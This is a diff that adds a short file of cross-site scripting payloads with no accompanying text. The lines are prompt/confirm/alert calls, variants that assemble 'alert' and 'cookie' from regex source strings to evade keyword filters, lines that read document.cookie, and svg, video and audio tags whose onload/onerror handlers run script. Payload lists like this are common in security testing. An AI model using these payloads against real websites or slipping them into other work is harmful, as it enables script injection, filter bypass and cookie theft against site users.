@@ -1,0 +1,13 @@
+prompt('xss')
+prompt(8)
+confirm('xss')
+confirm(8)
+alert(/xss/.source)
+window[/alert/.source](8)
+with(document)alert(cookie)
+alert(document['cookie'])
+alert(document[/cookie/.source])
+alert(document[/coo/.source+/kie/.source])
+<svg/onload=alert(1)>
+<video src=x onerror=alert(1);>
+<audio src=x onerror=alert(1);>
